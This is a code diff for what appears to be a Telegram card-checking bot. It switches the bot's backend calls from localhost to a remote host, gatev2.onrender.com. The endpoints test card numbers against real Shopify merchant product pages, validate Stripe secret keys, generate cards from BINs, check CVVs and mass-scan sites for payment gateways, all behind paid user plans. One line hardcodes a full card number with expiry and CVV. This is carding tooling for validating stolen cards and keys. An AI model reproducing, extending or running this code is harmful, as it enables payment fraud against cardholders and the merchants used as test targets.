@@ -1627,7 +1627,7 @@ async def check_url(session, url):
     short_identifier = str(len(url_states))
     start_time = time.time()
     try:
-        api_url = f"http://127.0.0.1:10000/gatev2?url={url}"
+        api_url = f"https://gatev2.onrender.com/gatev2?url={url}"
         async with session.get(api_url) as response:
             response_time = time.time() - start_time
 
@@ -1793,7 +1793,7 @@ async def massgate_process(client, message, user_info, *args, **kwargs):
     os.remove(file_path)
 
 async def check_massgate_url(session, url):
-    api_url = f"http://127.0.0.1:10000/gatev2?url={url}"
+    api_url = f"https://gatev2.onrender.com/gatev2?url={url}"
     async with session.get(api_url) as response:
         if response.status == 200:
             data = await response.json()
@@ -2070,7 +2070,7 @@ async def check_sk_key(client, message, user_info, *args, **kwargs):
     plan = user_info.get('plan', 'Free')
 
     start_time = time.time()
-    api_url = f"http://127.0.0.1:10000/sk?sk={sk_key}"
+    api_url = f"https://gatev2.onrender.com/sk?sk={sk_key}"
     
     processing_message = await message.reply('<b>Checking SK key...</b>', parse_mode=enums.ParseMode.HTML, disable_web_page_preview=True)
     
@@ -2170,7 +2170,7 @@ async def check_sk_key(client, message, user_info, *args, **kwargs):
 
 
 async def check_single_sk(sk_key):
-    api_url = f"http://127.0.0.1:10000/sk?sk={sk_key}"
+    api_url = f"https://gatev2.onrender.com/sk?sk={sk_key}"
     async with aiohttp.ClientSession() as session:
         try:
             async with session.get(api_url, timeout=10) as response:
@@ -2516,7 +2516,7 @@ async def process_stripe_five(client: Client, message: Message, user_info: dict,
         return
 
     start_time = time.time()
-    api_url = f"http://127.0.0.1:10000/genbin?brand={brand}&amount={amount}"
+    api_url = f"https://gatev2.onrender.com/genbin?brand={brand}&amount={amount}"
     sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E") #Replace with your sticker ID
     processing_message = await message.reply('Processing...', parse_mode=enums.ParseMode.HTML)
 
@@ -2911,7 +2911,7 @@ async def process_shopify(client, message, user_info, *args, **kwargs):
     plan = user_info.get('plan', 'Free')
 
     start_time = time.time()
-    api_url = f"http://127.0.0.1:10000/shopify?cc={cc}&product=https://kasuttamu.com/products/punpun"
+    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://kasuttamu.com/products/punpun"
     
     processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
     
@@ -2990,7 +2990,7 @@ async def process_so(client, message, user_info, *args, **kwargs):
     plan = user_info.get('plan', 'Free')
 
     start_time = time.time()
-    api_url = f"http://127.0.0.1:10000/shopify?cc={cc}&product=https://shopcgx.com/./products/vf-4x6-usa-ctn-flagw-cup"
+    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://shopcgx.com/./products/vf-4x6-usa-ctn-flagw-cup"
     
     processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
     
@@ -3069,7 +3069,7 @@ async def process_su(client, message, user_info, *args, **kwargs):
     plan = user_info.get('plan', 'Free')
 
     start_time = time.time()
-    api_url = f"http://127.0.0.1:10000/shopify?cc={cc}&product=https://www.garnetandgold.com/products/small-garnet-round-beads"
+    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://www.garnetandgold.com/products/small-garnet-round-beads"
     
     processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
     
@@ -3149,7 +3149,7 @@ async def process_li(client, message, user_info, *args, **kwargs):
     plan = user_info.get('plan', 'Free')
 
     start_time = time.time()
-    api_url = f"http://127.0.0.1:10000/shopify?cc={cc}&product=https://umbranoctis.com//products/seraphs-embrace"
+    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://umbranoctis.com//products/seraphs-embrace"
     
     processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
     
@@ -3915,7 +3915,7 @@ async def process_stripe_five(client: Client, message: Message, user_info: dict,
     currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'
 
     # API call to xronak.whf.bz (replace with your actual API)
-    api_url = f"http://127.0.0.1:10000/cvv?lista={cc}" 
+    api_url = f"https://gatev2.onrender.com/cvv?lista={cc}" 
 
     sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
     processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
@@ -5994,7 +5994,7 @@ async def process_stripe_five(client: Client, message: Message, user_info: dict,
   start_time = time.time()
 
   # API call to xronak.whf.bz (replace with your actual API)
-  api_url = f"http://127.0.0.1:10000/shopify?cc={cc}&product={url}" 
+  api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product={url}" 
 
   sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
   processing_message = await message.reply(' Cooking Something Good....! ', parse_mode=enums.ParseMode.HTML)
@@ -6054,7 +6054,7 @@ async def process_li(client, message, user_info, *args, **kwargs):
     plan = user_info.get('plan', 'Free')
 
     start_time = time.time()
-    api_url = f"http://127.0.0.1:10000/shopify?cc={cc}&product=https://vptrends.com.pe//products/case-de-silicona-slim-para-tecpods-pro-blanco"
+    api_url = f"https://gatev2.onrender.com/shopify?cc={cc}&product=https://vptrends.com.pe//products/case-de-silicona-slim-para-tecpods-pro-blanco"
     
     processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)
     
@@ -6153,7 +6153,7 @@ async def mass_process_urls(client, message, user_info, *args, **kwargs):
     for url in urls:
       try:  # Wrap the entire URL processing in a try-except block
         start_time = time.time()
-        gate_api_url = f"http://127.0.0.1:10000/gatev2?url={url}" #First API
+        gate_api_url = f"https://gatev2.onrender.com/gatev2?url={url}" #First API
 
         try:
           async with session.get(gate_api_url, timeout=30) as gate_response:  #Added timeout
@@ -6168,7 +6168,7 @@ async def mass_process_urls(client, message, user_info, *args, **kwargs):
             shopify_api_response = ""
             if cheapest_product_url:
                 start_time_shopify = time.time()
-                shopify_api_url = f"http://127.0.0.1:10000/shopify?cc=5578503073259776|04|2027|360&product={cheapest_product_url}" #Second API
+                shopify_api_url = f"https://gatev2.onrender.com/shopify?cc=5578503073259776|04|2027|360&product={cheapest_product_url}" #Second API
                 try:
                     async with session.get(shopify_api_url, timeout=30) as shopify_response:  #Added timeout
                         shopify_api_response = await shopify_response.text()
@@ -6829,7 +6829,7 @@ async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
     os.remove(file_path)
     
 #-------------------------
-ver = "alpha2.5.7-8"
+ver = "alpha2.5.7-9"
 
 print(f"\nBot version 》{ver}\n")
 
